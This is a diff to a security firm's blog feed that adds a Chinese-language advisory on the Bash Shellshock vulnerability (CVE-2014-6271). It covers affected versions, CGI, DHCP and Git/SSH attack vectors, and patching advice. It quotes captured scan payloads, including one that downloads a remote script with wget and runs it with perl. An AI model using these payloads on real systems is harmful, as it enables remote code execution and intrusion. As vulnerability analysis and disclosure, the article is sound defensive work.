@@ -4,13 +4,300 @@
  <title>DEVCORE 戴夫寇爾</title>
  <link href="http://devco.re/" rel="self"/>
  <link href="http://devco.re"/>
- <updated>2014-09-30T13:15:38+08:00</updated>
+ <updated>2014-10-01T13:04:30+08:00</updated>
  <id>http://devco.re</id>
  <author>
    <name>DEVCORE</name>
    <email>contact [at] devco.re</email>
  </author>
 
+ 
+ <entry>
+   <title>Shellshock (Bash CVE-2014-6271) 威脅仍在擴大中，但無需過度恐慌</title>
+   <link href="http://devco.re/blog/2014/09/30/shellshock-CVE-2014-6271/"/>
+   <updated>2014-09-30T00:00:00+08:00</updated>
+   <id>http://devco.re/blog/2014/09/30/shellshock-CVE-2014-6271</id>
+   <content type="html">
+&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-REhuiuIYlf8/VCuEEjtKi8I/AAAAAAAAAso/dp99DcsbPEA/w702-h478-no/ByWDCZwIAAAjCts.jpg&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-REhuiuIYlf8/VCuEEjtKi8I/AAAAAAAAAso/dp99DcsbPEA/w702-h478-no/ByWDCZwIAAAjCts.jpg&quot; alt=&quot;ShellShocked&quot; title=&quot;ShellShocked&quot; /&gt;&lt;/a&gt;
+[ Ref: &lt;a href=&quot;https://twitter.com/SynAckPwn/status/514961810320293888/photo/1&quot;&gt;OMG ΉΆXOR(twitter)&lt;/a&gt;]&lt;/p&gt;
+
+&lt;p&gt;自 9/24 以來，不少資訊圈朋友日以繼夜的忙碌，這都多虧了藏在 Bash 裡 22 年的安全漏洞－&lt;a href=&quot;https://en.wikipedia.org/wiki/Shellshock_%28software_bug%29&quot;&gt;Shellshock&lt;/a&gt; (Bash CVE-2014-6271)。對於惡意攻擊者而言，這是今年來第二波掏金潮，相較於上次 &lt;a href=&quot;http://devco.re/blog/2014/04/09/openssl-heartbleed-CVE-2014-0160/&quot;&gt;Heartbleed&lt;/a&gt; 駭客們的刮刮樂遊戲需要拼運氣，這次的 Shellshock 只要一發現利用點，就能馬上擁有基本的系統操作權限，也難怪 &lt;a href=&quot;http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-6271&quot;&gt;NVD&lt;/a&gt; 給予 Shellshock 最嚴重的 10.0 分影響等級。&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;p&gt;Shellshock 受影響的 Bash 版本如下：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Bash 4.3 Patch 25 （含）以前版本&lt;/li&gt;
+  &lt;li&gt;Bash 4.2 Patch 48 （含）以前版本&lt;/li&gt;
+  &lt;li&gt;Bash 4.1 Patch 12 （含）以前版本&lt;/li&gt;
+  &lt;li&gt;Bash 4.0 Patch 39 （含）以前版本&lt;/li&gt;
+  &lt;li&gt;Bash 3.2 Patch 52 （含）以前版本&lt;/li&gt;
+  &lt;li&gt;Bash 3.1 Patch 18 （含）以前版本&lt;/li&gt;
+  &lt;li&gt;Bash 3.0 Patch 17 （含）以前版本&lt;/li&gt;
+  &lt;li&gt;Bash 2.0.5b Patch 8 （含）以前版本&lt;/li&gt;
+  &lt;li&gt;Bash 1.14.7 （含）以前版本&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;這次的問題出在 bash 對環境變數的解析上。若有辦法在環境變數中塞入惡意的程式碼，並且順利將這些環境變數傳入 bash，bash 就會因解析錯誤而執行惡意指令、和讓攻擊者能直接對系統進行基本的操作。原始碼及更進階的原理請參考&lt;a href=&quot;http://blog.erratasec.com/2014/09/the-shockingly-bad-code-of-bash.html&quot;&gt;這篇&lt;/a&gt;。Shellshock 之所以嚴重，一來是因為攻擊語法相當簡單，只需要一行指令，就可以直接對系統進行操作；二來是因為 bash 使用範圍極廣，多款作業系統預設 shell 就是 bash。 常見的作業系統與其預設 shell 整理如下：&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;作業系統&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;預設 shell&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;CentOS&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;bash&lt;/font&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Fedora&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;bash&lt;/font&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;RHEL&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;bash&lt;/font&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Mac OS X&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;bash&lt;/font&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Android&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;早期是 ash, 3.0 開始是 mksh&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Debian&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;sh (Lenny, 5.0)&lt;br /&gt;dash (Squeeze, 6.0)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;embedded device&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;大部分使用 busybox (ash)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;FreeBSD&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;tcsh&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Ubuntu&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;dash&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;iOS&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Jailbreak 後是 bash&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;&lt;br /&gt;
+我們看到近半數知名的 un*x 系統預設使用 bash，可以推想這次影響範圍有多廣，尤其是許多服務都架構在這之上，若遭受到攻擊，損失的可能是企業的機密資料或客戶資料。至於沒有預設使用 bash 的作業系統，也並不意味著完全沒有風險，例如 Ubuntu 在 DHCP 客戶端使用到 bash ，就仍然會有風險，下面文章中也會提到這樣的狀況。另外，早期新聞中常出現物聯網設備會受此漏洞影響的報導，經過我們實測，物聯網設備為求精簡，大多使用 busybox，而其 shell 為 ash，故大多數設備在這次 Shellshock 威脅中影響不大，不過儘管物聯網設備逃過了這次 Shellshock 事件，有許多設備仍然是&lt;a href=&quot;http://devco.re/blog/2014/09/24/security-of-ip-camera-and-nvr/&quot;&gt;赤裸裸&lt;/a&gt;的。&lt;/p&gt;
+
+&lt;h3 id=&quot;shellshock-&quot;&gt;常見的 Shellshock 利用方式&lt;/h3&gt;
+
+&lt;p&gt;Shellshock 漏洞被公布後，惡意攻擊者無不想要透過這個漏洞對伺服器進行遠端攻擊，一些遠端攻擊概念也陸續被證實。最早的&lt;a href=&quot;http://blog.erratasec.com/2014/09/bash-shellshock-scan-of-internet.html&quot;&gt;公開大量掃描&lt;/a&gt;是由 Errata Security 在其部落格公布技術細節，他們在 HTTP 請求表頭中的 Cookie、Host、Referer 中放置惡意語法 &lt;code&gt;() { :; }; ping -c 3 209.126.230.74&lt;/code&gt;，並且利用 masscan 對全世界 HTTP 伺服器 (port 80) 進行掃描。因為一般伺服器會將 HTTP 表頭中之內容放入環境變數中，若伺服器首頁入口程式本身是 bash shell script 或者其子程序有呼叫到 bash，就會受到惡意語法的影響，執行 &lt;code&gt;ping -c 3 209.126.230.74&lt;/code&gt; 指令。&lt;/p&gt;
+
+&lt;h4 id=&quot;cgi-&quot;&gt;攻擊使用 CGI 的網頁伺服器&lt;/h4&gt;
+
+&lt;p&gt;利用同樣的道理，惡意攻擊者開始在 HTTP 表頭中置入惡意的語法，大量去掃描網路上的 CGI 網頁，因為這種網頁常呼叫系統指令，所以成功機率都頗高，攻擊成功的結果如下圖，從這張圖也可了解這個弱點可以簡單地透過一個參數就能直接讓系統執行任意指令。&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://lh5.googleusercontent.com/-QY_2lmgtmlQ/VCrMKHc21KI/AAAAAAAAAsM/Dj4HSgIOOKU/w878-h626-no/shellshock_cgi2.png&quot;&gt;&lt;img src=&quot;https://lh5.googleusercontent.com/-QY_2lmgtmlQ/VCrMKHc21KI/AAAAAAAAAsM/Dj4HSgIOOKU/w878-h626-no/shellshock_cgi2.png&quot; alt=&quot;攻擊使用 CGI 的網頁伺服器&quot; title=&quot;攻擊使用 CGI 的網頁伺服器&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;詳細的實作流程請參考下面影片：&lt;/p&gt;
+
+&lt;center&gt;&lt;div class=&quot;videowrapper&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;420&quot; src=&quot;http://www.youtube.com/embed/rSj1v8pFVKg&quot; frameborder=&quot;0&quot;&gt; &lt;/iframe&gt;&lt;/div&gt;&lt;/center&gt;
+
+&lt;p&gt;&lt;br /&gt;
+我們團隊也在 CGI 環境下執行幾種程式語言進行測試，發現用到以下 function 時會讀取到環境變數（date 只是範例，可代換為其他系統指令），因此若伺服器在 CGI 環境下使用這些 function，會為伺服器本身帶來嚴重風險。&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Language&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Vulnerable Function&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Perl&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;exec(“date &amp;gt; /dev/null”);&lt;br /&gt;open(SHELLSHOCK, “| date &amp;gt; /dev/null”);&lt;br /&gt;system(“date &amp;gt; /dev/null;”);&lt;br /&gt;print `date &amp;gt; /dev/null`&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;PHP&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;exec(‘date’);&lt;br /&gt;system(‘date’);&lt;br /&gt;mb_send_mail();&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Python&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;os.system(‘date’)&lt;br /&gt;subprocess.call(‘date’, shell=True)&lt;br /&gt;subprocess.Popen(‘date’, shell=True)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Ruby&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;`date`&lt;br /&gt;exec ‘date’&lt;br /&gt;system ‘date’&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;dhcp-&quot;&gt;建置惡意 DHCP 伺服器感染連線使用者&lt;/h4&gt;
+
+&lt;p&gt;同時，有另一批人發現某些作業系統在進行 DHCP 連線時，會將 DHCP 伺服器傳入的一些資訊塞入到環境變數中。於是，若建置一個惡意 DHCP 伺服器，對其連線的使用者就有很高的機會遭受攻擊。我們實際做了實驗攻擊一般使用者，在使用者建立連線的當下放置後門，實驗過程如下影片： &lt;/p&gt;
+
+&lt;center&gt;&lt;div class=&quot;videowrapper&quot;&gt;&lt;iframe width=&quot;560&quot; height=&quot;420&quot; src=&quot;http://www.youtube.com/embed/rSj1v8pFVKg&quot; frameborder=&quot;0&quot;&gt; &lt;/iframe&gt;&lt;/div&gt;&lt;/center&gt;
+
+&lt;p&gt;&lt;br /&gt;
+我們也分別測試了在不同作業系統下是否會受到惡意 DHCP 伺服器影響，基本上，常見的 un*x 系統開機後自動連線基本上都會中招。&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;OS&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Version&lt;/th&gt;
+      &lt;th style=&quot;text-align: left&quot;&gt;Vulnerable&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;CentOS&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;7.0&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;YES&lt;/font&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Debian&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;7.6&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;YES&lt;/font&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Fedora&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;20&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;YES&lt;/font&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Ubuntu&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;10.04.1 LTS&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;YES&lt;/font&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Ubuntu&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;14.04.1 LTS&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;&lt;font color=&quot;red&quot;&gt;YES&lt;/font&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Android&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;4.4.4&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;NO&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Apple iOS&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;7.0.4&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;NO&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;FreeBSD&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;10.0&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;NO&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Gentoo&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;20140925&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;NO (已修復)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Linux Mint&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;17 “Qiana” Cinnamon&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;NO &lt;sup id=&quot;fnref:note2&quot;&gt;&lt;a href=&quot;#fn:note2&quot; class=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Linux Mint&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Debian 201403 Cinnamon&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;NO &lt;sup id=&quot;fnref:note2:1&quot;&gt;&lt;a href=&quot;#fn:note2&quot; class=&quot;footnote&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Mac OS X&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;10.9.5&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;NO&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;openSUSE&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;13.2&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;NO &lt;sup id=&quot;fnref:note1&quot;&gt;&lt;a href=&quot;#fn:note1&quot; class=&quot;footnote&quot;&gt;2&lt;/a&gt;&lt;/sup&gt;&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;Synology&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;5.0-4493 update 7&lt;/td&gt;
+      &lt;td style=&quot;text-align: left&quot;&gt;NO (已修復)&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;gitsubversion--shell-&quot;&gt;繞過 Git/Subversion 伺服器的 shell 限制&lt;/h4&gt;
+
+&lt;p&gt;Shellshock 也常被利用來繞過伺服器的 shell 限制，最常見的就是 Git 和 Subversion 伺服器：
+通常這些伺服器允許透過 SSH 連線，但登入後都對應著受限制的 shell。透過此漏洞，可以繞過 shell 的限制，執行指令如下圖。（註：OS 中 git user 預設 shell 要為 bash 才會受到影響）&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://lh6.googleusercontent.com/-6fJsJ1BkK6c/VCrMAm9n57I/AAAAAAAAAsE/ovEnfiijQ-g/w878-h530-no/shellshock_test_git.png&quot;&gt;&lt;img src=&quot;https://lh6.googleusercontent.com/-6fJsJ1BkK6c/VCrMAm9n57I/AAAAAAAAAsE/ovEnfiijQ-g/w878-h530-no/shellshock_test_git.png&quot; alt=&quot;繞過 Git/Subversion 伺服器的 shell 限制&quot; title=&quot;繞過 Git/Subversion 伺服器的 shell 限制&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;一般我們要實作特定使用者登入 ssh 只能做特定的事情，常常會在 sshd_config 設定 ForceCommand，或是在 authorized_keys 設定 command= 如下：&lt;/p&gt;
+
+&lt;p&gt;&lt;code&gt;
+command=&quot;[path]/gl-auth-command sitaram&quot;,[more options] ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA18S2t...
+&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;這次會受到 Shellshock 影響，就是因為這些設定會在使用者透過 ssh 登入時，呼叫 bash 執行，當環境變數被引入，惡意的程式碼就會被執行了。&lt;/p&gt;
+
+&lt;h3 id=&quot;shellshock--1&quot;&gt;Shellshock 威脅仍在擴大&lt;/h3&gt;
+
+&lt;p&gt;目前不管是白帽駭客或是黑帽駭客都還在持續尋找可以利用 Shellshock 的地方，如同前面所述，找到可以寫入環境變數的地方，並且順利傳入 bash 執行，就可以利用該弱點來執行更進一步的攻擊。&lt;/p&gt;
+
+&lt;p&gt;從 Shellshock 爆發至今，陸陸續續傳出了很多公司的產品受到此弱點影響，整理&lt;a href=&quot;http://www.kb.cert.org/vuls/byvendor?searchview&amp;amp;Query=FIELD+Reference=252743&amp;amp;SearchOrder=4&quot;&gt;在此&lt;/a&gt;，也有一些 POC 整理在&lt;a href=&quot;https://github.com/mubix/shellshocker-pocs/&quot;&gt;這裡&lt;/a&gt;。 其中不乏出現一些常用知名套件如：OpenVPN、Pure-FTPd，而且持續更新中。&lt;/p&gt;
+
+&lt;p&gt;現在針對 HTTP 伺服器的攻擊還是佔多數，截至目前為止我們仍持續發現網路上有各種掃描樣本，例如：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;() { :;}; /bin/bash -c &quot;echo testing9123123&quot;; /bin/uname -a&lt;/li&gt;
+  &lt;li&gt;() { :;}; /bin/bash -c &quot;wget -P /var/tmp 174.143.2XX.XX/…/x ; perl /var/tmp/x&quot;&lt;/li&gt;
+  &lt;li&gt;() { :;};echo vOLniO4dcLqW2I3MnIVpSfk8bmzyxXaIF$(echo vOLniO4dcLqW2I3MnIVpSfk8bmzyxXaIF)vOLniO4dcLqW2I3MnIVpSfk8bmzyxXaIF&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;除了這些陸續針對 HTTP 伺服器的案例，我們認為，一些公司購入的網路設備是 Shellshock 潛在高危險群，那些買來就擺在旁邊維運的設備，一來容易被忽略，二來是其更新不易，三來這些設備常使用到 bash，因此仍是現在惡意攻擊者專注研究的目標，請大家特別小心。&lt;/p&gt;
+
+&lt;h3 id=&quot;section&quot;&gt;結論：無需過度恐慌，但別掉以輕心&lt;/h3&gt;
+
+&lt;p&gt;「只要有 bash 的系統全部都是受駭範圍！」&lt;/p&gt;
+
+&lt;p&gt;不少朋友看到最近 Shellshock 的新聞報導，都十分緊張。儘管各位所使用的 bash 是含有漏洞的版本，但要成功執行攻擊手法需要許多條件，被攻擊者從遠端攻擊的機率偏低，因此大家不需要太過恐慌，只要注意以下設備或伺服器：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;特定 Linux 版本，並且使用 DHCP 連線&lt;/li&gt;
+  &lt;li&gt;網路、資安設備&lt;/li&gt;
+  &lt;li&gt;使用 CGI 的網站伺服器&lt;/li&gt;
+  &lt;li&gt;已經公布含有弱點的套件&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;那我們該怎麼自保呢？在攻擊手法不斷精進之下，只過濾 CVE-2014-6271 的攻擊字串並沒有辦法完全阻擋攻擊。建議可以先將伺服器的 bash 升級至最新版本，並持續關注後續更新訊息（目前持續有繞過檢查的新 CVE 弱點發佈），使用 CGI 之伺服器搭配 iptables、IDS、Mod Security 等機制偵測攻擊特徵並將其阻擋。若有設備在這次的影響範圍，也記得向原廠索取更新程式。&lt;/p&gt;
+
+&lt;h3 id=&quot;section-1&quot;&gt;題外話&lt;/h3&gt;
+
+&lt;p&gt;有人說：「Linux 在 2014 年接連出包，真是一個不安全的作業系統！反觀 Windows 在這幾次都毫無影響，企業應該要全面改用 Microsoft Solution！」，但這真的是正確的想法嗎？其實一個 OpenSource 的系統、軟體，可以藉由社群的力量檢視原始碼的問題，集合眾人的力量讓系統變得更加安全。因此有被揭露出漏洞，對於一個系統來說是好事。而非 OpenSource 的系統，就只能仰賴原廠自己的資安團隊進行研究，或者是外部資安人員的發掘了。選擇作業系統的原則，最好依照系統的功能需求、產品定位、安全漏洞的修補速度等層面，才能夠選用真正符合自己需要的系統。&lt;/p&gt;
+
+&lt;h3 id=&quot;section-2&quot;&gt;註解&lt;/h3&gt;
+
+&lt;div class=&quot;footnotes&quot;&gt;
+  &lt;ol&gt;
+    &lt;li id=&quot;fn:note2&quot;&gt;
+      &lt;p&gt;若手動執行 dhclient，則會遭到漏洞影響。 &lt;a href=&quot;#fnref:note2&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt; &lt;a href=&quot;#fnref:note2:1&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;sup&gt;2&lt;/sup&gt;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+    &lt;li id=&quot;fn:note1&quot;&gt;
+      &lt;p&gt;系統環境變數會受到影響，但無法被攻擊者利用。 &lt;a href=&quot;#fnref:note1&quot; class=&quot;reversefootnote&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
+    &lt;/li&gt;
+  &lt;/ol&gt;
+&lt;/div&gt;
+</content>
+ </entry>
  
  <entry>
    <title>網路攝影機、DVR、NVR 的資安議題 - 你知道我在看你嗎？</title>
